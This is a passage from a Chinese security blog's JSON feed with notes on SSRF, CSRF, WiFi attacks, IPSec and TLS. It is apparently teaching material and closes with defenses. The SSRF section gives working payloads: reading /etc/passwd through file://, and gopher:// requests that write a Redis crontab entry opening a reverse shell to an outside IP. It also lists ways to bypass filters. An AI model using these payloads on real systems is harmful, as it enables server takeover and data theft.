            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。</p>\n<h2 id=\"漏洞危害\"><a class=\"anchor\" href=\"#漏洞危害\">#</a> 漏洞危害</h2>\n<p>SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>\n<p>以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：</p>\n<pre><code>curl -vvv 'dict://127.0.0.1:6379/info'\n\ncurl -vvv 'file:///etc/passwd'\n\n# * 注意: 链接使用单引号，避免$变量问题\n\ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n</code></pre>\n<h1 id=\"相关危险函数\"><a class=\"anchor\" href=\"#相关危险函数\">#</a> 相关危险函数</h1>\n<p>SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  <code>file_get_contents()</code>  /  <code>fsockopen()</code>  /  <code>curl_exec()</code>  等。</p>\n<h1 id=\"过滤绕过\"><a class=\"anchor\" href=\"#过滤绕过\">#</a> 过滤绕过</h1>\n<h2 id=\"更改ip地址写法\"><a class=\"anchor\" href=\"#更改ip地址写法\">#</a> 更改 IP 地址写法</h2>\n<p>一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：</p>\n<ul>\n<li><code>^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;3&#125;$</code></li>\n<li><code>^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$</code></li>\n<li><code>^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$</code></li>\n</ul>\n<p>对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：</p>\n<ul>\n<li>8 进制格式：0300.0250.0.1</li>\n<li>16 进制格式：0xC0.0xA8.0.1</li>\n<li>10 进制整数格式：3232235521</li>\n<li>16 进制整数格式：0xC0A80001</li>\n<li>合并后两位：1.1.278 / 1.1.755</li>\n<li>合并后三位：1.278 / 1.755 / 3.14159267</li>\n</ul>\n<p>另外 IP 中的每一位，各个进制可以混用。</p>\n<p>访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。</p>\n<p>另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。</p>\n<h2 id=\"使用解析到内网的域名\"><a class=\"anchor\" href=\"#使用解析到内网的域名\">#</a> 使用解析到内网的域名</h2>\n<p>如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。</p>\n<p>另外  <code>xip.io</code>  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=\">例如 192.168.0.1.xip.io</span>，解析到 192.168.0.1。</p>\n<h2 id=\"利用解析url所出现的问题\"><a class=\"anchor\" href=\"#利用解析url所出现的问题\">#</a> 利用解析 URL 所出现的问题</h2>\n<p>在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。</p>\n<p>比如  <code>http://www.baidu.com@192.168.0.1/</code>  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t\">也就是 www.baidu.com</span>，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t\">很有可能会认为访问 URL 的 host 为 www.baidu.com</span>，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。</p>\n<h2 id=\"利用跳转\"><a class=\"anchor\" href=\"#利用跳转\">#</a> 利用跳转</h2>\n<p>如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>\n<p>可以使用如 <span class=\"exturl\" data-url=\"aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=\">http://httpbin.org/redirect-to?url=http://192.168.0.1</span> 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>\n<p>常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。</p>\n<h2 id=\"通过各种非http协议\"><a class=\"anchor\" href=\"#通过各种非http协议\">#</a> 通过各种非 HTTP 协议</h2>\n<p>如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。</p>\n<p>比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：</p>\n<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a\n</code></pre>\n<p>除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  <code>file:///path/to/file</code>  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  <code>file:///d:/1.txt</code>  来访问 D 盘中 1.txt 的内容。</p>\n<h2 id=\"dns-rebinding\"><a class=\"anchor\" href=\"#dns-rebinding\">#</a> DNS Rebinding</h2>\n<p>一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。</p>\n<p>但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。</p>\n<p>要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：</p>\n<ul>\n<li>服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP</li>\n<li>对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证</li>\n<li>服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。</li>\n<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>\n</ul>\n<h2 id=\"利用ipv6\"><a class=\"anchor\" href=\"#利用ipv6\">#</a> 利用 IPv6</h2>\n<p>有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  <code>[::]</code>   <code>0000::1</code>  或 IPv6 的内网域名来绕过过滤。</p>\n<h2 id=\"利用idn\"><a class=\"anchor\" href=\"#利用idn\">#</a> 利用 IDN</h2>\n<p>一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>\n<p>在这些字符中，部分字符会在访问时做一个等价转换，例如  <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code>  和  <code>example.com</code>  等同。利用这种方式，可以用  <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code>  等字符绕过内网限制。</p>\n<h1 id=\"可能的利用点\"><a class=\"anchor\" href=\"#可能的利用点\">#</a> 可能的利用点</h1>\n<h2 id=\"内网服务\"><a class=\"anchor\" href=\"#内网服务\">#</a> 内网服务</h2>\n<ul>\n<li>Apache Hadoop 远程命令执行</li>\n<li>axis2-admin 部署 Server 命令执行</li>\n<li>Confluence SSRF</li>\n<li>counchdb WEB API 远程命令执行</li>\n<li>dict</li>\n<li>docker API 远程命令执行</li>\n<li>Elasticsearch 引擎 Groovy 脚本命令执行</li>\n<li>ftp /ftps（FTP 爆破）</li>\n<li>glassfish 任意文件读取和 war 文件部署间接命令执行</li>\n<li>gopher</li>\n<li>HFS 远程命令执行</li>\n<li>http、https</li>\n<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>\n<li>Java 调试接口命令执行</li>\n<li>JBOSS 远程 Invoker war 命令执行</li>\n<li>Jenkins Scripts 接口命令执行</li>\n<li>ldap</li>\n<li>mongodb</li>\n<li>php_fpm/fastcgi 命令执行</li>\n<li>rtsp - smb/smbs（连接 SMB）</li>\n<li>sftp</li>\n<li>ShellShock 命令执行</li>\n<li>Struts2 命令执行</li>\n<li>telnet</li>\n<li>tftp（UDP 协议扩展）</li>\n<li>tomcat 命令执行</li>\n<li>WebDav PUT 上传任意文件</li>\n<li>WebSphere Admin 可部署 war 间接命令执行</li>\n<li>zentoPMS 远程命令执行</li>\n</ul>\n<h2 id=\"redis利用\"><a class=\"anchor\" href=\"#redis利用\">#</a> Redis 利用</h2>\n<ul>\n<li>写 ssh 公钥</li>\n<li>写 crontab</li>\n<li>写 WebShell</li>\n<li>Windows 写启动项</li>\n<li>主从复制加载 .so 文件</li>\n<li>主从复制写无损文件</li>\n</ul>\n<h2 id=\"云主机\"><a class=\"anchor\" href=\"#云主机\">#</a> 云主机</h2>\n<p>在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。</p>\n<h1 id=\"防御方式\"><a class=\"anchor\" href=\"#防御方式\">#</a> 防御方式</h1>\n<ul>\n<li>过滤返回的信息</li>\n<li>统一错误信息</li>\n<li>限制请求的端口</li>\n<li>禁止不常用的协议</li>\n<li>对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s\">SSRF 漏洞分析与利用</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==\">A New Era Of SSRF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx\">php ssrf technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=\">谈一谈如何在 Python 开发中拒绝 SSRF 漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==\">SSRF Tips</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s\">SSRF in PHP</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "SSRF"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/",
            "title": "CSRF",
            "date_published": "2022-11-26T08:58:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<h2 id=\"资源包含\"><a class=\"anchor\" href=\"#资源包含\">#</a> 资源包含</h2>\n<p>资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 &lt;image&gt;、&lt;audio&gt;、&lt;video&gt;、&lt;object&gt;、&lt;script &gt; 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。</p>\n<p>由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。</p>\n<h2 id=\"基于表单\"><a class=\"anchor\" href=\"#基于表单\">#</a> 基于表单</h2>\n<p>通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单；其包含一个 JavaScript 片段，强制受害者的浏览器提交。</p>\n<p>该表单可以完全由隐藏的元素组成，以致受害者很难发现它。</p>\n<p>如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。</p>\n<h2 id=\"xmlhttprequest\"><a class=\"anchor\" href=\"#xmlhttprequest\">#</a> XMLHttpRequest</h2>\n<p>XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。</p>\n<p>基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。</p>\n<p>这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。</p>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>通过 CSRF-token 或者验证码来检测用户提交</li>\n<li>验证 Referer/Content-Type</li>\n<li>对于用户修改删除等操作最好都使用 POST 操作</li>\n<li>避免全站通用的 Cookie，严格设置 Cookie 的域</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ2l0aHViLmNvbS9qcm96bmVyL2NzcmYtZGVtbw==\">demo</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=\">Wiping Out CSRF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9uZWF0LXRyaWNrcy10by1ieXBhc3MtY3NyZnByb3RlY3Rpb24=\">Neat tricks to bypass CSRF protection</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "CSRF"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/WiFi/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/WiFi/",
            "title": "WiFi",
            "date_published": "2022-11-26T08:48:19.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Wi-Fi 又称 “无线热点” 或 “无线网络”，是 Wi-Fi 联盟的商标，一个基于 IEEE 802.11 标准的无线局域网技术。</p>\n<h1 id=\"攻击\"><a class=\"anchor\" href=\"#攻击\">#</a> 攻击</h1>\n<h2 id=\"暴力破解\"><a class=\"anchor\" href=\"#暴力破解\">#</a> 暴力破解</h2>\n<p>WiFi 密码是基于预置的秘钥，可以通过抓取报文的方式在本地快速的批量进行密码爆破尝试。</p>\n<h2 id=\"伪造热点\"><a class=\"anchor\" href=\"#伪造热点\">#</a> 伪造热点</h2>\n<p>AP 可以动态的广播自己，客户也可以主动发送探针请求。可以伪造 AP 发送对探针请求的响应包，来让客户端错误的识别。</p>\n<h2 id=\"秘钥重装攻击\"><a class=\"anchor\" href=\"#秘钥重装攻击\">#</a> 秘钥重装攻击</h2>\n<p>该漏洞由 Vanhoef 发现。Wi-Fi 在握手时双方会更新秘钥，该攻击通过重放握手信息，令客户端重新安装相同的秘钥。</p>\n<h2 id=\"dragonblood\"><a class=\"anchor\" href=\"#dragonblood\">#</a> Dragonblood</h2>\n<p>最新版的 WPA3 标准在实现上存在一些问题，同样由 Vanhoef 发现。包含拒绝服务攻击、降级攻击、侧信道泄露等。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2ktZmkub3JnLw==\">Wi-Fi Alliance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9kcmFnb25ibG9vZC5wZGY=\">Dragonblood</span> : Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9ub3Jkc2VjMjAxOS5wZGY=\">Improving Privacy through Fast Passive Wi-Fi Scanning</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9hc2lhY2NzMjAxOS5wZGY=\">Practical Side-Channel Attacks against WPA-TKIP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlcnMubWF0aHl2YW5ob2VmLmNvbS9ibGFja2hhdC1ldTIwMTcucGRm\">Key Reinstallation Attacks: Breaking the WPA2 Protocol</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc2NjQ=\">RFC 7664 Dragonfly Key Exchange</span></li>\n</ul>\n",
            "tags": [
                "计算机网络",
                "WiFi"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/IPSec/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/IPSec/",
            "title": "IPSec",
            "date_published": "2022-11-26T08:47:59.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>IPsec（IP Security）是 IETF 制定的三层隧道加密协议，它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在 IP 层通过加密与数据源认证等方式，提供了以下的安全服务：</p>\n<ul>\n<li>数据机密性（Confidentiality）：IPsec 发送方在通过网络传输包前对包进行加密。</li>\n<li>数据完整性（Data Integrity）：IPsec 接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。</li>\n<li>数据来源认证（Data Authentication）：IPsec 在接收端可以认证发送 IPsec 报文的发送端是否合法。</li>\n<li>防重放（Anti-Replay）：IPsec 接收方可检测并拒绝接收过时或重复的报文。</li>\n</ul>\n<h1 id=\"优点\"><a class=\"anchor\" href=\"#优点\">#</a> 优点</h1>\n<p>IPsec 具有以下优点：</p>\n<ul>\n<li>支持 IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过 IKE 建立和维护 SA 的服务，简化了 IPsec 的使用和管理。</li>\n<li>所有使用 IP 协议进行数据传输的应用系统和服务都可以使用 IPsec，而不必对这些应用系统和服务本身做任何修改。</li>\n<li>对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而且有助于进一步提高 IP 数据包的安全性，可以有效防范网络攻击。</li>\n</ul>\n<h1 id=\"构成\"><a class=\"anchor\" href=\"#构成\">#</a> 构成</h1>\n<p>IPsec 由四部分内容构成：</p>\n<ul>\n<li>负责密钥管理的 Internet 密钥交换协议 IKE（Internet Key Exchange Protocol）</li>\n<li>负责将安全服务与使用该服务的通信流相联系的安全关联 SA（Security Associations）</li>\n<li>直接操作数据包的认证头协议 AH（IP Authentication Header）和安全载荷协议 ESP（IP Encapsulating Security Payload）</li>\n<li>若干用于加密和认证的算法</li>\n</ul>\n<h1 id=\"安全联盟security-associationsa\"><a class=\"anchor\" href=\"#安全联盟security-associationsa\">#</a> 安全联盟（Security Association，SA）</h1>\n<p>IPsec 在两个端点之间提供安全通信，端点被称为 IPsec 对等体。</p>\n<p>SA 是 IPsec 的基础，也是 IPsec 的本质。SA 是通信对等体间对某些要素的约定，例如，使用哪种协议（AH、ESP 还是两者结合使用）、协议的封装模式（传输模式和隧道模式）、加密算法（DES、3DES 和 AES）、特定流中保护数据的共享密钥以及密钥的生存周期等。建立 SA 的方式有手工配置和 IKE 自动协商两种。</p>\n<p>SA 是单向的，在两个对等体之间的双向通信，最少需要两个 SA 来分别对两个方向的数据流进行安全保护。同时，如果两个对等体希望同时使用 AH 和 ESP 来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的 SA。</p>\n<p>SA 由一个三元组来唯一标识，这个三元组包括 SPI（Security Parameter Index，安全参数索引）、目的 IP 地址、安全协议号（AH 或 ESP）。</p>\n<p>SPI 是用于唯一标识 SA 的一个 32 比特数值，它在 AH 和 ESP 头中传输。在手工配置 SA 时，需要手工指定 SPI 的取值。使用 IKE 协商产生 SA 时，SPI 将随机生成。</p>\n<h1 id=\"ike\"><a class=\"anchor\" href=\"#ike\">#</a> IKE</h1>\n<p>IKE（RFC2407，RFC2408、RFC2409）属于一种混合型协议，由 Internet 安全关联和密钥管理协议（ISAKMP）和两种密钥交换协议 OAKLEY 与 SKEME 组成。IKE 创建在由 ISAKMP 定义的框架上，沿用了 OAKLEY 的密钥交换模式以及 SKEME 的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。</p>\n<p>IKE 使用了两个阶段的 ISAKMP：</p>\n<p>第一阶段，协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的 IKE 通信提供机密性、消息完整性以及消息源验证服务； 第二阶段，使用已建立的 IKE SA 建立 IPsec SA（V2 中叫 Child SA）。</p>\n",
            "tags": [
                "计算机网络",
                "IPSec",
                "VPN"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/SSL%E3%80%81TLS/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/SSL%E3%80%81TLS/",
            "title": "SSL/TLS",
            "date_published": "2022-11-26T08:42:19.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>SSL 全称是 Secure Sockets Layer，安全套接字层，它是由网景公司 (Netscape) 在 1994 年时设计，主要用于 Web 的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL 已经成为互联网保密通信的工业标准。</p>\n<p>SSL 最初的几个版本 (SSL 1.0、SSL2.0、SSL 3.0) 由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组 (IETF) 正式接管，并更名为 TLS (Transport Layer Security)，发展至今已有 TLS 1.0、TLS1.1、TLS1.2、TLS1.3 这几个版本。</p>\n<p>如 TLS 名字所说，SSL/TLS 协议仅保障传输层安全。同时，由于协议自身特性 (数字证书机制)，SSL/TLS 不能被用于保护多跳 (multi-hop) 端到端通信，而只能保护点到点通信。</p>\n<p>SSL/TLS 协议能够提供的安全目标主要包括如下几个：</p>\n<ul>\n<li>认证性：借助数字证书认证服务端端和客户端身份，防止身份伪造</li>\n<li>机密性：借助加密防止第三方窃听</li>\n<li>完整性：借助消息认证码 (MAC) 保障数据完整性，防止消息篡改</li>\n<li>重放保护：通过使用隐式序列号防止重放攻击</li>\n</ul>\n<p>为了实现这些安全目标，SSL/TLS 协议被设计为一个两阶段协议，分为握手阶段和应用阶段：</p>\n<p>握手阶段也称协商阶段，在这一阶段，客户端和服务端端会认证对方身份 (依赖于 PKI 体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及 MasterSecret。后续通信使用的所有密钥都是通过 MasterSecret 生成。 在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。</p>\n<h1 id=\"协议\"><a class=\"anchor\" href=\"#协议\">#</a> 协议</h1>\n<p>TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。</p>\n<h2 id=\"记录协议\"><a class=\"anchor\" href=\"#记录协议\">#</a> 记录协议</h2>\n<p>记录协议 (Record Protocol) 规定了 TLS 收发数据的基本单位记录 (record)。</p>\n<h2 id=\"警报协议\"><a class=\"anchor\" href=\"#警报协议\">#</a> 警报协议</h2>\n<p>警报协议 (Alert Protocol) 用于提示协议交互过程出现错误。</p>\n<h2 id=\"握手协议\"><a class=\"anchor\" href=\"#握手协议\">#</a> 握手协议</h2>\n<p>握手协议 (Handshake Protocol) 是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。</p>\n<h2 id=\"变更密码规范协议\"><a class=\"anchor\" href=\"#变更密码规范协议\">#</a> 变更密码规范协议</h2>\n<p>变更密码规范协议 (Change Cipher Spec Protocol) 是一个 “通知”，告诉对方，后续的数据都将使用加密保护。</p>\n<h1 id=\"交互过程\"><a class=\"anchor\" href=\"#交互过程\">#</a> 交互过程</h1>\n<h2 id=\"client-hello\"><a class=\"anchor\" href=\"#client-hello\">#</a> Client Hello</h2>\n<p>Client Hello 由客户端发送，内容包括客户端的一个 Unix 时间戳 (GMT Unix Time)、一些随机的字节 (Random Bytes)，还包括了客户端接受的算法类型 (Cipher Suites)。</p>\n<h2 id=\"server-hello\"><a class=\"anchor\" href=\"#server-hello\">#</a> Server Hello</h2>\n<p>Server Hello 由服务端发送，内容包括服务端支持的算法类型、GMT Unix Time 以及 Random Bytes。</p>\n<h2 id=\"certificate\"><a class=\"anchor\" href=\"#certificate\">#</a> Certificate</h2>\n<p>由服务端或者客户端发送，发送方会会将自己的数字证书发送给接收方，由接收方进行证书验证，如果不通过的话，接收方会中断握手的过程。一般跟在 Client / Server Hello 报文之后。</p>\n<h2 id=\"server-key-exchange\"><a class=\"anchor\" href=\"#server-key-exchange\">#</a> Server Key Exchange</h2>\n<p>由服务端发送，将自己的公钥参数传输给了客户端，一般也和 Server Hello 与 Certificate 在一个 TCP 报文中。</p>\n<h2 id=\"server-hello-done\"><a class=\"anchor\" href=\"#server-hello-done\">#</a> Server Hello Done</h2>\n<p>服务端发送，一般也和 Server Hello、Certificate 和 Server Key Exchange 在一个 TCP 报文中。</p>\n<h2 id=\"client-key-exchange\"><a class=\"anchor\" href=\"#client-key-exchange\">#</a> Client Key Exchange</h2>\n<p>客户端发送，向服务端发送自己的公钥参数，与服务端协商密钥。</p>\n<h2 id=\"change-cipher-spec\"><a class=\"anchor\" href=\"#change-cipher-spec\">#</a> Change Cipher Spec</h2>\n<p>客户端或者服务端发送，紧跟着 Key Exchange 